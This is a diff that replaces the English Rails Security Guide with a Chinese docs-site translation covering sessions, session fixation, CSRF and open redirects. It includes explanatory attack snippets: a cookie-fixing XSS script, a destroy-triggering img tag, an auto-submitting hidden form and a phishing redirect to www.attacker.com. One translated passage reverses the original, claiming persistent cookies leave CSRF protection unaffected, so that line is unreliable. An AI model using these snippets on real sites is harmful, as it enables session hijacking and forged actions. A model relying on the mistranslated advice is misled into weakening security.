@@ -1,167 +1,174 @@
-Ruby on Rails Security Guide
-============================
+---
+layout: docs
+title: Rails 安全指南
+prev_section: testing
+next_section: debugging_rails_applications
+---
 
-This manual describes common security problems in web applications and how to avoid them with Rails.
+本文介绍网页程序中常见的安全隐患，以及如何在 Rails 中防范。
 
-After reading this guide, you will know:
+读完本文后，你将学到：
 
-* All countermeasures _that are highlighted_.
-* The concept of sessions in Rails, what to put in there and popular attack methods.
-* How just visiting a site can be a security problem (with CSRF).
-* What you have to pay attention to when working with files or providing an administration interface.
-* How to manage users: Logging in and out and attack methods on all layers.
-* And the most popular injection attack methods.
+* 所有推荐使用的安全对策；
+* Rails 中会话的概念，应该在会话中保存什么内容，以及常见的攻击方式；
+* 单单访问网站为什么也有安全隐患（跨站请求伪造）；
+* 处理文件以及提供管理界面时应该注意哪些问题；
+* 如果管理用户：登录、退出，以及各种攻击方式；
+* 最常见的注入攻击方式；
 
---------------------------------------------------------------------------------
+---
 
-Introduction
-------------
+## 简介 {#introduction}
 
-Web application frameworks are made to help developers build web applications. Some of them also help you with securing the web application. In fact one framework is not more secure than another: If you use it correctly, you will be able to build secure apps with many frameworks. Ruby on Rails has some clever helper methods, for example against SQL injection, so that this is hardly a problem.
+网页程序框架的作用是帮助开发者构建网页程序。有些框架还能增强网页程序的安全性。其实框架之间无所谓谁更安全，只要使用得当，就能开发出安全的程序。Rails 提供了很多智能的帮助方法，例如避免 SQL 注入的方法，可以避免常见的安全隐患。我很欣慰，我所审查的 Rails 程序安全性都很高。
 
-In general there is no such thing as plug-n-play security. Security depends on the people using the framework, and sometimes on the development method. And it depends on all layers of a web application environment: The back-end storage, the web server and the web application itself (and possibly other layers or applications).
+一般来说，安全措施不能随取随用。安全性取决于开发者怎么使用框架，有时也跟开发方式有关。而且，安全性受程序架构的影响：存储方式，服务器，以及框架本身等。
 
-The Gartner Group however estimates that 75% of attacks are at the web application layer, and found out "that out of 300 audited sites, 97% are vulnerable to attack". This is because web applications are relatively easy to attack, as they are simple to understand and manipulate, even by the lay person.
+不过，根据加特纳咨询公司的研究，约有 75% 的攻击发生在网页程序层，“在 300 个审查的网站中，97% 有被攻击的可能”。网页程序相对而言更容易攻击，因为其工作方式易于理解，即使是外行人也能发起攻击。
 
-The threats against web applications include user account hijacking, bypass of access control, reading or modifying sensitive data, or presenting fraudulent content. Or an attacker might be able to install a Trojan horse program or unsolicited e-mail sending software, aim at financial enrichment or cause brand name damage by modifying company resources. In order to prevent attacks, minimize their impact and remove points of attack, first of all, you have to fully understand the attack methods in order to find the correct countermeasures. That is what this guide aims at.
+网页程序面对的威胁包括：窃取账户，绕开访问限制，读取或修改敏感数据，显示欺诈内容。攻击者有可能还会安装木马程序或者来路不明的邮件发送程序，用于获取经济利益，或者修改公司资源，破坏企业形象。为了避免受到攻击，最大程度的降低被攻击后的影响，首先要完全理解各种攻击方式，这样才能有的放矢，找到最佳对策——这就是本文的目的。
 
-In order to develop secure web applications you have to keep up to date on all layers and know your enemies. To keep up to date subscribe to security mailing lists, read security blogs and make updating and security checks a habit (check the <a href="#additional-resources">Additional Resources</a> chapter). It is done manually because that's how you find the nasty logical security problems.
+为了能开发出安全的网页程序，你必须要了解所用组件的最新安全隐患，做到知己知彼。想了解最新的安全隐患，可以订阅安全相关的邮件列表，阅读关注安全的博客，养成更新和安全检查的习惯。详情参阅“[其他资源](#additional-resources)”一节。我自己也会动手检查，这样才能找到可能引起安全问题的代码。
 
-Sessions
---------
+## 会话 {#sessions}
 
-A good place to start looking at security is with sessions, which can be vulnerable to particular attacks.
+会话是比较好的切入点，有一些特定的攻击方式。
 
-### What are Sessions?
+### 会话是什么 {#what-are-sessions-questionmark}
 
-NOTE: _HTTP is a stateless protocol. Sessions make it stateful._
+I> HTTP 是无状态协议，会话让其变成有状态。
 
-Most applications need to keep track of certain state of a particular user. This could be the contents of a shopping basket or the user id of the currently logged in user. Without the idea of sessions, the user would have to identify, and probably authenticate, on every request.
-Rails will create a new session automatically if a new user accesses the application. It will load an existing session if the user has already used the application.
+大多数程序都要记录用户的特定状态，例如购物车里的商品，或者当前登录用户的 ID。没有会话，每次请求都要识别甚至重新认证用户。Rails 会为访问网站的每个用户创建会话，如果同一个用户再次访问网站，Rails 会加载现有的会话。
 
-A session usually consists of a hash of values and a session id, usually a 32-character string, to identify the hash. Every cookie sent to the client's browser includes the session id. And the other way round: the browser will send it to the server on every request from the client. In Rails you can save and retrieve values using the session method:
+会话一般会存储一个 Hash，以及会话 ID。ID 是由 32 个字符组成的字符串，用于识别 Hash。发送给浏览器的每个 cookie 中都包含会话 ID，而且浏览器发送到服务器的每个请求中也都包含会话 ID。在 Rails 程序中，可以使用 `session` 方法保存和读取会话：
 
-```ruby
+{:lang="ruby"}
+~~~
 session[:user_id] = @current_user.id
 User.find(session[:user_id])
-```
+~~~
 
-### Session id
+### 会话 ID {#session-id}
 
-NOTE: _The session id is a 32 byte long MD5 hash value._
+I> 会话 ID 是 32 位字节长的 MD5 哈希值。
 
-A session id consists of the hash value of a random string. The random string is the current time, a random number between 0 and 1, the process id number of the Ruby interpreter (also basically a random number) and a constant string. Currently it is not feasible to brute-force Rails' session ids. To date MD5 is uncompromised, but there have been collisions, so it is theoretically possible to create another input text with the same hash value. But this has had no security impact to date.
+会话 ID 是一个随机生成的哈希值。这个随机生成的字符串中包含当前时间，0 和 1 之间的随机数字，Ruby 解释器的进程 ID（随机生成的数字），以及一个常量。目前，还无法暴力破解 Rails 的会话 ID。虽然 MD5 很难破解，但却有可能发生同值碰撞。理论上有可能创建完全一样的哈希值。不过，这没什么安全隐患。
 
-### Session Hijacking
+### 会话劫持 {#session-hijacking}
 
-WARNING: _Stealing a user's session id lets an attacker use the web application in the victim's name._
+W> 窃取用户的会话 ID 后，攻击者就能以该用户的身份使用网页程序。
 
-Many web applications have an authentication system: a user provides a user name and password, the web application checks them and stores the corresponding user id in the session hash. From now on, the session is valid. On every request the application will load the user, identified by the user id in the session, without the need for new authentication. The session id in the cookie identifies the session.
+很多网页程序都有身份认证系统，用户提供用户名和密码，网页程序验证提供的信息，然后把用户的 ID 存储到会话 Hash 中。此后，这个会话都是有效的。每次请求时，程序都会从会话中读取用户 ID，加载对应的用户，避免重新认证用户身份。cookie 中的会话 ID 用于识别会话。
 
-Hence, the cookie serves as temporary authentication for the web application. Anyone who seizes a cookie from someone else, may use the web application as this user - with possibly severe consequences. Here are some ways to hijack a session, and their countermeasures:
+因此，cookie 是网页程序身份认证系统的中转站。得到 cookie，就能以该用户的身份访问网站，这会导致严重的后果。下面介绍几种劫持会话的方法以及对策。
 
-* Sniff the cookie in an insecure network. A wireless LAN can be an example of such a network. In an unencrypted wireless LAN it is especially easy to listen to the traffic of all connected clients. For the web application builder this means to _provide a secure connection over SSL_. In Rails 3.1 and later, this could be accomplished by always forcing SSL connection in your application config file:
+*   在不加密的网络中嗅听 cookie。无线局域网就是一种不安全的网络。在不加密的无线局域网中，监听网内客户端发起的请求极其容易。这是不建议在咖啡店工作的原因之一。对网页程序开发者来说，可以使用 SSL 建立安全连接避免嗅听。在 Rails 3.1 及以上版本中，可以在程序的设置文件中设置强制使用 SSL 连接：
 
-    ```ruby
+    {:lang="ruby"}
+    ~~~
     config.force_ssl = true
-    ```
+    ~~~
 
-* Most people don't clear out the cookies after working at a public terminal. So if the last user didn't log out of a web application, you would be able to use it as this user. Provide the user with a _log-out button_ in the web application, and _make it prominent_.
+*   大多数用户在公用终端中完工后不清除 cookie。如果前一个用户没有退出网页程序，你就能以该用户的身份继续访问网站。网页程序中一定要提供“退出”按钮，而且要放在特别显眼的位置。
 
-* Many cross-site scripting (XSS) exploits aim at obtaining the user's cookie. You'll read <a href="#cross-site-scripting-xss">more about XSS</a> later.
+*   很多跨站脚本（cross-site scripting，简称 XSS）的目的就是窃取用户的 cookie。详情参阅“[跨站脚本](#cross-site-scripting-xss)”一节。
 
-* Instead of stealing a cookie unknown to the attacker, they fix a user's session identifier (in the cookie) known to them. Read more about this so-called session fixation later.
+*   有时攻击者不会窃取用户的 cookie，而为用户指定一个会话 ID。这叫做“会话固定攻击”，后文会详细介绍。
 
-The main objective of most attackers is to make money. The underground prices for stolen bank login accounts range from $10-$1000 (depending on the available amount of funds), $0.40-$20 for credit card numbers, $1-$8 for online auction site accounts and $4-$30 for email passwords, according to the [Symantec Global Internet Security Threat Report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf).
+大多数攻击者的动机是获利。[赛门铁克全球互联网安全威胁报告](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf)指出，在地下市场，窃取银行账户的价格为 10-1000 美元（视账户余额而定），窃取信用卡卡号的价格为 0.40-20 美元，窃取在线拍卖网站账户的价格为 1-8 美元，窃取 Email 账户密码的价格为 4-30 美元。
 
-### Session Guidelines
+### 会话安全指南 {#session-guidelines}
 
-Here are some general guidelines on sessions.
+下面是一些常规的会话安全指南。
 
-* _Do not store large objects in a session_. Instead you should store them in the database and save their id in the session. This will eliminate synchronization headaches and it won't fill up your session storage space (depending on what session storage you chose, see below).
-This will also be a good idea, if you modify the structure of an object and old versions of it are still in some user's cookies. With server-side session storages you can clear out the sessions, but with client-side storages, this is hard to mitigate.
+* **不在会话中存储大型对象。**大型对象要存储在数据库中，会话中只保存对象的 ID。这么做可以避免同步问题，也不会用完会话存储空间（空间大小取决于所使用的存储方式，详情见后文）。如果在会话中存储大型对象，修改对象结构后，旧版数据仍在用户的 cookie 中。在服务器端存储会话可以轻而易举地清除旧会话数据，但在客户端中存储会话就无能为力了。
 
-* _Critical data should not be stored in session_. If the user clears their cookies or closes the browser, they will be lost. And with a client-side session storage, the user can read the data.
+* **敏感数据不能存储在会话中。**如果用户清除 cookie，或者关闭浏览器，数据就没了。在客户端中存储会话数据，用户还能读取敏感数据。
 
-### Session Storage
+### 会话存储 {#session-storage}
 
-NOTE: _Rails provides several storage mechanisms for the session hashes. The most important is `ActionDispatch::Session::CookieStore`._
+I> Rails 提供了多种存储会话的方式，其中最重要的一个是 `ActionDispatch::Session::CookieStore`。
 
-Rails 2 introduced a new default session storage, CookieStore. CookieStore saves the session hash directly in a cookie on the client-side. The server retrieves the session hash from the cookie and eliminates the need for a session id. That will greatly increase the speed of the application, but it is a controversial storage option and you have to think about the security implications of it:
+Rails 2 引入了一个新的默认会话存储方式，`CookieStore`。`CookieStore` 直接把会话存储在客户端的 cookie 中。服务器无需会话 ID，可以直接从 cookie 中获取会话。这种存储方式能显著提升程序的速度，但却存在争议，因为有潜在的安全隐患：
 
-* Cookies imply a strict size limit of 4kB. This is fine as you should not store large amounts of data in a session anyway, as described before. _Storing the current user's database id in a session is usually ok_.
+* cookie 中存储的内容长度不能超过 4KB。这个限制没什么影响，因为前面说过，会话中不应该存储大型数据。**在会话中存储用户对象在数据库中的 ID 一般来说也是可接受的。**
 
-* The client can see everything you store in a session, because it is stored in clear-text (actually Base64-encoded, so not encrypted). So, of course, _you don't want to store any secrets here_. To prevent session hash tampering, a digest is calculated from the session with a server-side secret and inserted into the end of the cookie.
+* 客户端能看到会话中的所有数据，因为其中的内容都是明文（使用 Base64 编码，因此没有加密）。因此，**不能存储敏感信息**。为了避免篡改会话，Rails 会根据服务器端的密令生成摘要，添加到 cookie 的末尾。
 
-That means the security of this storage depends on this secret (and on the digest algorithm, which defaults to SHA1, for compatibility). So _don't use a trivial secret, i.e. a word from a dictionary, or one which is shorter than 30 characters_.
+因此，cookie 的安全性取决于这个密令（以及计算摘要的算法，为了兼容，默认使用 SHA1）。**密令不能随意取值，例如从字典中找个单词，长度也不能少于 30 个字符。**
 
-`secrets.secret_key_base` is used for specifying a key which allows sessions for the application to be verified against a known secure key to prevent tampering. Applications get `secrets.secret_key_base` initialized to a random key present in `config/secrets.yml`, e.g.:
+`secrets.secret_key_base` 指定一个密令，程序的会话用其和已知的安全密令比对，避免会话被篡改。`secrets.secret_key_base` 是个随机字符串，保存在文件 `config/secrets.yml` 中：
 
-    development:
-      secret_key_base: a75d...
+{:lang="yaml"}
+~~~
+development:
+  secret_key_base: a75d...
 
-    test:
-      secret_key_base: 492f...
+test:
+  secret_key_base: 492f...
 
-    production:
-      secret_key_base: <%= ENV["SECRET_KEY_BASE"] %>
+production:
+  secret_key_base: <%= ENV["SECRET_KEY_BASE"] %>
+~~~
 
-Older versions of Rails use CookieStore, which uses `secret_token` instead of `secret_key_base` that is used by EncryptedCookieStore. Read the upgrade documentation for more information.
+Rails 以前版本中的 `CookieStore` 使用 `secret_token`，新版中的 `EncryptedCookieStore` 使用 `secret_key_base`。详细说明参见升级指南。
 
-If you have received an application where the secret was exposed (e.g. an application whose source was shared), strongly consider changing the secret.
+如果你的程序密令暴露了（例如，程序的源码公开了），强烈建议你更换密令。
 
-### Replay Attacks for CookieStore Sessions
+### `CookieStore` 存储会话的重放攻击 {#replay-attacks-for-cookiestore-sessions}
 
-TIP: _Another sort of attack you have to be aware of when using `CookieStore` is the replay attack._
+T> 使用 `CookieStore` 存储会话时要注意一种叫做“重放攻击”（replay attack）的攻击方式。
 
-It works like this:
+重放攻击的工作方式如下：
 
-* A user receives credits, the amount is stored in a session (which is a bad idea anyway, but we'll do this for demonstration purposes).
-* The user buys something.
-* Their new, lower credit will be stored in the session.
-* The dark side of the user forces them to take the cookie from the first step (which they copied) and replace the current cookie in the browser.
-* The user has their credit back.
+* 用户收到一些点数，数量存储在会话中（不应该存储在会话中，这里只做演示之用）；
+* 用户购买了商品；
+* 剩余点数还在会话中；
+* 用户心生歹念，复制了第一步中的 cookie，替换掉浏览器中现有的 cookie；
+* 用户的点数又变成了消费前的数量；
 
-Including a nonce (a random value) in the session solves replay attacks. A nonce is valid only once, and the server has to keep track of all the valid nonces. It gets even more complicated if you have several application servers (mongrels). Storing nonces in a database table would defeat the entire purpose of CookieStore (avoiding accessing the database).
+在会话中写入一个随机值（nonce）可以避免重放攻击。这个随机值只能通过一次验证，服务器记录了所有合法的随机值。如果程序用到了多个服务器情况就变复杂了。把随机值存储在数据库中就违背了使用 `CookieStore` 的初衷（不访问数据库）。
 
-The best _solution against it is not to store this kind of data in a session, but in the database_. In this case store the credit in the database and the logged_in_user_id in the session.
+避免重放攻击最有力的方式是，不在会话中存储这类数据，将其存到数据库中。针对上例，可以把点数存储在数据库中，把登入用户的 ID 存储在会话中。
 
-### Session Fixation
+### 会话固定攻击 {#session-fixation}
 
-NOTE: _Apart from stealing a user's session id, the attacker may fix a session id known to them. This is called session fixation._
+I> 攻击者可以不窃取用户的会话 ID，使用一个已知的会话 ID。这叫做“会话固定攻击”（session fixation）
 
-![Session fixation](images/session_fixation.png)
+![会话固定攻击]({{ site.baseurl }}/images/session_fixation.png)
 
-This attack focuses on fixing a user's session id known to the attacker, and forcing the user's browser into using this id. It is therefore not necessary for the attacker to steal the session id afterwards. Here is how this attack works:
+会话固定攻击的关键是强制用户的浏览器使用攻击者已知的会话 ID。因此攻击者无需窃取会话 ID。攻击过程如下：
 
-* The attacker creates a valid session id: They load the login page of the web application where they want to fix the session, and take the session id in the cookie from the response (see number 1 and 2 in the image).
-* They maintain the session by accessing the web application periodically in order to keep an expiring session alive.
-* The attacker forces the user's browser into using this session id (see number 3 in the image). As you may not change a cookie of another domain (because of the same origin policy), the attacker has to run a JavaScript from the domain of the target web application. Injecting the JavaScript code into the application by XSS accomplishes this attack. Here is an example: `<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`. Read more about XSS and injection later on.
-* The attacker lures the victim to the infected page with the JavaScript code. By viewing the page, the victim's browser will change the session id to the trap session id.
-* As the new trap session is unused, the web application will require the user to authenticate.
-* From now on, the victim and the attacker will co-use the web application with the same session: The session became valid and the victim didn't notice the attack.
+* 攻击者创建一个合法的会话 ID：打开网页程序的登录页面，从响应的 cookie 中获取会话 ID（如上图中的第 1 和第 2 步）。
+* 程序有可能在维护会话，每隔一段时间，例如 20 分钟，就让会话过期，减少被攻击的可能性。因此，攻击者要不断访问网页程序，让会话保持可用。
+* 攻击者强制用户的浏览器使用这个会话 ID（如上图中的第 3 步）。由于不能修改另一个域名中的 cookie（基于同源原则），攻击者就要想办法在目标网站的域中运行 JavaScript，通过跨站脚本把 JavaScript 注入目标网站。一个跨站脚本示例：`<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`。跨站脚本及其注入方式参见后文。
+* 攻击者诱引用户访问被 JavaScript 代码污染的网页。查看这个页面后，用户浏览器中的会话 ID 就被篡改成攻击者伪造的会话 ID。
+* 因为伪造的会话 ID 还没用过，所以网页程序要认证用户的身份。
+* 此后，用户和攻击者就可以共用同一个会话访问这个网站了。攻击者伪造的会话 ID 漂白了，而用户浑然不知。
 
-### Session Fixation - Countermeasures
+### 会话固定攻击的对策 {#session-fixation-countermeasures}
 
-TIP: _One line of code will protect you from session fixation._
+T> 只需一行代码就能避免会话固定攻击。
 
-The most effective countermeasure is to _issue a new session identifier_ and declare the old one invalid after a successful login. That way, an attacker cannot use the fixed session identifier. This is a good countermeasure against session hijacking, as well. Here is how to create a new session in Rails:
+最有效的对策是，登录成功后重新设定一个新的会话 ID，原来的会话 ID 作废。这样，攻击者就无法使用固定的会话 ID 了。这个对策也能有效避免会话劫持。在 Rails 中重设会话的方式如下：
 
-```ruby
+{:lang="ruby"}
+~~~
 reset_session
-```
+~~~
 
-If you use the popular RestfulAuthentication plugin for user management, add reset_session to the SessionsController#create action. Note that this removes any value from the session, _you have to transfer them to the new session_.
+如果用了流行的 RestfulAuthentication 插件管理用户，要在 `SessionsController#create` 动作中调用 `reset_session` 方法。注意，这个方法会清除会话中的所有数据，**你要把用户转到新的会话中**。
 
-Another countermeasure is to _save user-specific properties in the session_, verify them every time a request comes in, and deny access, if the information does not match. Such properties could be the remote IP address or the user agent (the web browser name), though the latter is less user-specific. When saving the IP address, you have to bear in mind that there are Internet service providers or large organizations that put their users behind proxies. _These might change over the course of a session_, so these users will not be able to use your application, or only in a limited way.
+另外一种对策是把用户相关的属性存储在会话中，每次请求都做验证，如果属性不匹配就禁止访问。用户相关的属性可以是 IP 地址或用户代理名（浏览器名），不过用户代理名和用户不太相关。存储 IP 地址时要注意，有些网络服务提供商或者大型组织把用户的真实 IP 隐藏在代理后面，对会话有比较大的影响，所以这些用户可能无法使用程序，或者使用受限。
 
-### Session Expiry
+### 会话过期 {#session-expiry}
 
-NOTE: _Sessions that never expire extend the time-frame for attacks such as cross-site request forgery (CSRF), session hijacking and session fixation._
+I> 永不过期的会话增加了跨站请求伪造、会话劫持和会话固定攻击的可能性。
 
-One possibility is to set the expiry time-stamp of the cookie with the session id. However the client can edit cookies that are stored in the web browser so expiring sessions on the server is safer. Here is an example of how to _expire sessions in a database table_. Call `Session.sweep("20 minutes")` to expire sessions that were used longer than 20 minutes ago.
+cookie 的过期时间可以通过会话 ID 设定。然而，客户端可以修改存储在浏览器中的 cookie，因此在服务器上把会话设为过期更安全。下面的例子把存储在数据库中的会话设为过期。`Session.sweep("20 minutes")` 把二十分钟前的会话设为过期。
 
-```ruby
+{:lang="ruby"}
+~~~
 class Session < ActiveRecord::Base
   def self.sweep(time = 1.hour)
     if time.is_a?(String)
@@ -171,56 +178,57 @@ class Session < ActiveRecord::Base
     delete_all "updated_at < '#{time.ago.to_s(:db)}'"
   end
 end
-```
+~~~
 
-The section about session fixation introduced the problem of maintained sessions. An attacker maintaining a session every five minutes can keep the session alive forever, although you are expiring sessions. A simple solution for this would be to add a created_at column to the sessions table. Now you can delete sessions that were created a long time ago. Use this line in the sweep method above:
+在“会话固定攻击”一节提到过维护会话的问题。虽然上述代码能把会话设为过期，但攻击者每隔五分钟访问一次网站就能让会话始终有效。对此，一个简单的解决办法是在会话数据表中添加 `created_at` 字段，删除很久以前创建的会话。在上面的代码中加入下面的代码即可：
 
-```ruby
+{:lang="ruby"}
+~~~
 delete_all "updated_at < '#{time.ago.to_s(:db)}' OR
   created_at < '#{2.days.ago.to_s(:db)}'"
-```
+~~~
 
-Cross-Site Request Forgery (CSRF)
----------------------------------
+## 跨站请求伪造 {#cross-site-request-forgery-csrf}
 
-This attack method works by including malicious code or a link in a page that accesses a web application that the user is believed to have authenticated. If the session for that web application has not timed out, an attacker may execute unauthorized commands.
+跨站请求伪造（cross-site request forgery，简称 CSRF）攻击的方法是在页面中包含恶意代码或者链接，攻击者认为被攻击的用户有权访问另一个网站。如果用户在那个网站的会话没有过期，攻击者就能执行未经授权的操作。
 
-![](images/csrf.png)
+![跨站请求伪造]({{ site.baseurl }}/images/csrf.png)
 
-In the <a href="#sessions">session chapter</a> you have learned that most Rails applications use cookie-based sessions. Either they store the session id in the cookie and have a server-side session hash, or the entire session hash is on the client-side. In either case the browser will automatically send along the cookie on every request to a domain, if it can find a cookie for that domain. The controversial point is, that it will also send the cookie, if the request comes from a site of a different domain. Let's start with an example:
+读过前一节我们知道，大多数 Rails 程序都使用 cookie 存储会话，可能只把会话 ID 存储在 cookie 中，而把会话内容存储在服务器上，或者把整个会话都存储在客户端。不管怎样，只要能找到针对某个域名的 cookie，请求时就会连同该域中的 cookie 一起发送。这就是问题所在，如果请求由域名不同的其他网站发起，也会一起发送 cookie。我们来看个例子。
 
-* Bob browses a message board and views a post from a hacker where there is a crafted HTML image element. The element references a command in Bob's project management application, rather than an image file.
-* `<img src="http://www.webapp.com/project/1/destroy">`
-* Bob's session at www.webapp.com is still alive, because he didn't log out a few minutes ago.
-* By viewing the post, the browser finds an image tag. It tries to load the suspected image from www.webapp.com. As explained before, it will also send along the cookie with the valid session id.
-* The web application at www.webapp.com verifies the user information in the corresponding session hash and destroys the project with the ID 1. It then returns a result page which is an unexpected result for the browser, so it will not display the image.
-* Bob doesn't notice the attack - but a few days later he finds out that project number one is gone.
+* Bob 访问一个留言板，其中有篇由黑客发布的帖子，包含一个精心制造的 HTML 图片元素。这个元素指向 Bob 的项目管理程序中的某个操作，而不是真正的图片文件。
+* 图片元素的代码为 `<img src="http://www.webapp.com/project/1/destroy">`。
+* Bob 在 www.webapp.com 网站上的会话还有效，因为他并没有退出。
+* 查看这篇帖子后，浏览器发现有个图片标签，尝试从 www.webapp.com 加载这个可疑的图片。如前所述，浏览器会同时发送 cookie，其中就包含可用的会话 ID。
+* www.webapp.com 验证了会话中的用户信息，销毁 ID 为 1 的项目。请求得到的响应页面浏览器无法解析，因此不会显示图片。
+* Bob 并未察觉到被攻击了，一段时间后才发现 ID 为 1 的项目不见了。
 
-It is important to notice that the actual crafted image or link doesn't necessarily have to be situated in the web application's domain, it can be anywhere - in a forum, blog post or email.
+有一点要特别注意，精心制作的图片或链接无需出现在网页程序的同一域名中，任何地方都可以，论坛、博客，甚至是电子邮件。
 
-CSRF appears very rarely in CVE (Common Vulnerabilities and Exposures) - less than 0.1% in 2006 - but it really is a 'sleeping giant' [Grossman]. This is in stark contrast to the results in many security contract works - _CSRF is an important security issue_.
+CSRF 很少出现在 CVE（通用漏洞披露，Common Vulnerabilities and Exposures）中，2006 年比例还不到 0.1%，但却是个隐形杀手。这倒和我（以及其他人）的安全合约工作得到的结果完全相反——**CSRF 是个严重的安全问题**。
 
-### CSRF Countermeasures
+### CSRF 的对策 {#csrf-countermeasures}
 
-NOTE: _First, as is required by the W3C, use GET and POST appropriately. Secondly, a security token in non-GET requests will protect your application from CSRF._
+I> 首先，遵守 W3C 的要求，适时地使用 GET 和 POST 请求。其次，在非 GET 请求中加入安全权标可以避免程序受到 CSRF 攻击。
 
-The HTTP protocol basically provides two main types of requests - GET and POST (and more, but they are not supported by most browsers). The World Wide Web Consortium (W3C) provides a checklist for choosing HTTP GET or POST:
+HTTP 协议提供了两种主要的基本请求类型，GET 和 POST（当然还有其他请求类型，但大多数浏览器都不支持）。万维网联盟（World Wide Web Consortium，简称 W3C）提供了一个检查表用于选择 GET 和 POST：
 
-**Use GET if:**
+**使用 GET 请求的情形：**
 
-* The interaction is more _like a question_ (i.e., it is a safe operation such as a query, read operation, or lookup).
+* 交互更像是在询问，例如查询，读取等安全的操作；
 
-**Use POST if:**
+**使用 POST 请求的情形：**
 
-* The interaction is more _like an order_, or
-* The interaction _changes the state_ of the resource in a way that the user would perceive (e.g., a subscription to a service), or
-* The user is _held accountable for the results_ of the interaction.
+* 交互更像是执行某项命令；
+* 交互改变了资源的状态，且用户能察觉到这个变化，例如订阅一项服务；
+* 交互的结果由用户负责；
 
-If your web application is RESTful, you might be used to additional HTTP verbs, such as PATCH, PUT or DELETE. Most of today's web browsers, however do not support them - only GET and POST. Rails uses a hidden `_method` field to handle this barrier.
+如果你的网页程序使用 REST 架构，可能已经用过其他 HTTP 请求，例如 PATCH、PUT 和 DELETE。现今的大多数浏览器都不支持这些请求，只支持 GET 和 POST。Rails 使用隐藏的 `_method` 字段处理这一难题。
 
-_POST requests can be sent automatically, too_. Here is an example for a link which displays www.harmless.com as destination in the browser's status bar. In fact it dynamically creates a new form that sends a POST request.
+**POST 请求也能自动发送。**举个例子，下面这个链接虽在浏览器的状态栏中显示的目标地址是 www.harmless.com，但其实却动态地创建了一个表单，发起 POST 请求。
 
-```html
+{:lang="html"}
+~~~
 <a href="http://www.harmless.com/" onclick="
   var f = document.createElement('form');
   f.style.display = 'none';
@@ -229,78 +237,85 @@ _POST requests can be sent automatically, too_. Here is an example for a link wh
   f.action = 'http://www.example.com/account/destroy';
   f.submit();
   return false;">To the harmless survey</a>
-```
+~~~
 
-Or the attacker places the code into the onmouseover event handler of an image:
+攻击者还可以把代码放在图片的 `onmouseover` 事件句柄中：
 
-```html
+{:lang="html"}
+~~~
 <img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />
-```
+~~~
 
-There are many other possibilities, like using a `<script>` tag to make a cross-site request to a URL with a JSONP or JavaScript response. The response is executable code that the attacker can find a way to run, possibly extracting sensitive data. To protect against this data leakage, we disallow cross-site `<script>` tags. Only Ajax requests may have JavaScript responses since XmlHttpRequest is subject to the browser Same-Origin policy - meaning only your site can initiate the request.
+伪造请求还有其他方式，例如使用 `<script>` 标签向返回 JSONP 或 JavaScript 的地址发起跨站请求。响应是可执行的代码，攻击者能找到方法执行其中的代码，获取敏感数据。为了避免这种数据泄露，可以禁止使用跨站 `<script>` 标签，只允许使用 Ajax 请求获取 JavaScript 响应，因为 XmlHttpRequest 遵守同源原则，只有自己的网站才能发起请求。
 
-To protect against all other forged requests, we introduce a _required security token_ that our site knows but other sites don't know. We include the security token in requests and verify it on the server. This is a one-liner in your application controller, and is the default for newly created rails applications:
+为了防止其他伪造请求，我们可以使用安全权标，这个权标只有自己的网站知道，其他网站不知道。我们要在请求中加入这个权标，且要在服务器上做验证。这些操作只需在控制器中加入下面这行代码就能完成：
 
-```ruby
-protect_from_forgery with: :exception
-```
+{:lang="ruby"}
+~~~
+protect_from_forgery
+~~~
 
-This will automatically include a security token in all forms and Ajax requests generated by Rails. If the security token doesn't match what was expected, an exception will be thrown.
+加入这行代码后，Rails 生成的所有表单和 Ajax 请求中都会包含安全权标。如果安全权标和预期的值不一样，程序会重置会话。
 
-It is common to use persistent cookies to store user information, with `cookies.permanent` for example. In this case, the cookies will not be cleared and the out of the box CSRF protection will not be effective. If you are using a different cookie store than the session for this information, you must handle what to do with it yourself:
+一般来说最好使用持久性 cookie 存储用户的信息，例如 `cookies.permanent`。此时，cookie 不会被清除，而且自动加入的 CSRF 保护措施也不会受到影响。如果此类信息没有使用会话存储在 cookie 中，就要自己动手处理：
 
-```ruby
-rescue_from ActionController::InvalidAuthenticityToken do |exception|
-  sign_out_user # Example method that will destroy the user cookies
+{:lang="ruby"}
+~~~
+def handle_unverified_request
+  super
+  sign_out_user # Example method that will destroy the user cookies.
 end
-```
+~~~
 
-The above method can be placed in the `ApplicationController` and will be called when a CSRF token is not present or is incorrect on a non-GET request.
+上述代码可以放到 `ApplicationController` 中，如果非 GET 请求中没有 CSRF 权标就会调用这个方法。
 
-Note that _cross-site scripting (XSS) vulnerabilities bypass all CSRF protections_. XSS gives the attacker access to all elements on a page, so they can read the CSRF security token from a form or directly submit the form. Read <a href="#cross-site-scripting-xss">more about XSS</a> later.
+注意，跨站脚本攻击会跳过所有 CSRF 保护措施。攻击者通过跨站脚本可以访问页面中的所有元素，因此能读取表单中的 CSRF 安全权标或者直接提交表单。详情参阅“[跨站脚本](#cross-site-scripting-xss)”一节。
 
-Redirection and Files
----------------------
+## 重定向和文件 {#redirection-and-files}
 
-Another class of security vulnerabilities surrounds the use of redirection and files in web applications.
+有一种安全漏洞由网页程序中的重定向和文件引起。
 
-### Redirection
+### 重定向 {#redirection}
 
-WARNING: _Redirection in a web application is an underestimated cracker tool: Not only can the attacker forward the user to a trap web site, they may also create a self-contained attack._
+W> 网页程序中的重定向是个被低估的破坏工具：攻击者可以把用户引到有陷阱的网站，或者制造独立攻击（self-contained attack）。
 
-Whenever the user is allowed to pass (parts of) the URL for redirection, it is possibly vulnerable. The most obvious attack would be to redirect users to a fake web application which looks and feels exactly as the original one. This so-called phishing attack works by sending an unsuspicious link in an email to the users, injecting the link by XSS in the web application or putting the link into an external site. It is unsuspicious, because the link starts with the URL to the web application and the URL to the malicious site is hidden in the redirection parameter: http://www.example.com/site/redirect?to= www.attacker.com. Here is an example of a legacy action:
